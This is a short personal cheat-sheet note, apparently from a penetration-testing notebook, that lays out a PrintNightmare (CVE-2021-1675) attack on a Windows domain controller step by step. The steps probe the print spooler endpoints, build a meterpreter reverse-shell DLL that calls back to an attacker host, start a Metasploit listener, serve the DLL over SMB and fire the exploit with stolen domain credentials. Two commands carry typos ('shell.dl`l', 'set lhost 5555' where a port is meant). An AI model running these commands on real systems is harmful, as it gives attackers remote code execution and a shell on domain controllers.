---
title: PRINTNIGHTMARE ATTACK
updated: 2023-09-29 05:23:13Z
created: 2023-09-29 05:19:56Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# PRINTNIGHTMARE ATTACK
1. `rpcdump.py @<DC IP> | egrep 'MS-RPRN|MS-PAR'` (reports if vulnerable)
2. Download **CVE-2021-1675.py** 
3. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=5555 -f dll > shell.dl`l
4. `msfconsole` 
5. `use multi/handler`
6. `set payload windows/x64/meterpreter/reverse_tcp`
7. `set lhost <attacker IP>` 
8. `set lhost 5555`
9. `run`
10. `smbserver.py share 'pwd' -smb2support` (run in same folder as shell.dll)
11. `python3 CVE-2021-1675.py DOMAIN.local/user:password@<DC IP> '\\<attacker IP>\share\shell.dll'`